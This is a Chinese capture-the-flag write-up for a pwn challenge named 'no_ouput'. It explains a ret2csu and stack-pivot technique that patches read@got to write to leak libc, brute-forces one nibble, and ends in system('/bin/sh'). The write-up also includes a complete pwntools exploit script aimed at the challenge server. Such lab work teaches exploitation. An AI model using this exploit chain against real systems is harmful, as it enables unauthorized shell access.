# W5 no ouput

~~肯定是把output的t漏了~~

## 文件分析

下载`no_ouput`, NX on, PIE off, Canary off, RELRO full  
ghidra分析为64位程序

## 解题思路

没有输出函数，但是csu_init在，可以轻松控制寄存器，那么因为 read
函数离 write 函数很近，可以由此打印出read@got拿到libcBase，然后就能调
`system("/bin/sh")`

那么首先修改.bss上的read为write，栈迁移执行，然后再次栈迁移，在栈上放置
`system("/bin/sh")`  
要注意的是，由于write比read高不少，超过了0xFF，又已知ASLR不会改变末12位，
而改是一个字节一个字节改的，因此`read & 0xF000`这4位是赌的，每次有1/16的概率能中，
并不是执行脚本就能一次打下来的

## 踩过的坑

1. write函数是对系统调用的封装，因此开栈不大，可以放心迁移
2. system执行的参数在这题只能是libc里的shstr，在.bss上捏的就不行，
网上也搜不到结果，请懂的师傅发个discussion
3. read会读取字符直到换行符（前提是读取的字节不够），sleep再久也没用（recv可以打断输入，
这时可以不用换行符）
4. 网上写可以用`elf.search(str).next()`，实际上不行，库里只有__next__()魔法方法，
因此需要用next包裹，如`next(elf.search(str))`
5. 看准时间提交...虽然比赛是周日晚9点更新题目，但是结束是在早上9点...
做出来了没提交上:(

## EXPLOIT

```python
from pwn import *

def payload(lo):
    global sh
    if lo:
        sh = process('no_ouput')
        gdb.attach(sh, 'b system')
        libc = ELF('/usr/lib/libc.so.6')
    else:
        sh = remote('node4.buuoj.cn', 29390)
        libc = ELF('libc-2.31.so')
    elf = ELF('no_ouput')
    popRdi = 0x401253
    popRsiR15 = 0x401251
    readPlt = elf.plt['read']
    readGot = elf.got['read']
    readBss = 0x404050
    bssHigh = 0x404800
    leaveRet = 0x4011ea

    # payload 1, pivot stack to readBss and read in shstr, stack pivot instruction & patch from read to write
    sh.sendline(b'0'*112 + p64(readBss - 0x30) + p64(popRsiR15) + p64(bssHigh - 16) + p64(0) + p64(readPlt) +
        p64(popRsiR15) + p64(readBss + 8) + p64(0) + p64(readPlt) +
        p64(popRsiR15) + p64(readBss - 0x30) + p64(0) + p64(readPlt) + p64(leaveRet))
    print('p1 send')
    if lo & 0b10:
        sleep(5) # wait for gdb to make manual debug easier
    else:
        sleep(0.5)

    # payload 2, make "/bin/sh" on .bss
    sh.sendline(b'/bin/sh'.ljust(16, b'\0') + p64(popRdi) + p64(0) + p64(popRsiR15) + p64(bssHigh + 0x30) + p64(0) + p64(readPlt))
    print('p4 send')
    sleep(0.5)

    # payload 3, stack pivot instruction, after this procedure, rip = bssHigh
    sh.sendline(p64(leaveRet))
    print('p3 send')
    sleep(0.5)
    
    # payload 4, patch read, if 0b10 digit debug on, read real readAddr from user
    if lo & 0b10:
        patch = p16(int(input('read addr:'), 16) - 0x520 + 0x1020)
    elif lo:
        patch = p16(0x8020)
    else:
        patch = p16(0x3060)
    sh.send(p64(bssHigh - 8) + p64(popRdi) + p64(1) + p64(popRsiR15) + p64(readGot) + p64(0) + patch)
    print('p2 send')
    sleep(0.5)

    try:
        libcBase = u64(sh.recv(6) + b'\0\0') - libc.symbols['read']
        sh.recv() # skip remaining chars from write() above
        system = libcBase + libc.symbols['system']
        shstr = libcBase + next(libc.search(b'/bin/sh')) # in python 3, use next() magic func like this

        # payload 5, write systemAddr on .bss
        # sh.sendline(p64(popRdi) + p64(bssHigh - 16) + p64(system)) # shstr on .bss can't open shell!
        sh.sendline(p64(popRdi) + p64(shstr) + p64(system))
        print('p5 send')
        sh.interactive()
        sh.close()
        return 0
    except EOFError:
        # in this case, patch is incorrect, leading to SIGSEGV
        print('addr not match')
        sh.close()
        return 1

while payload(0):
    pass
```

Done.
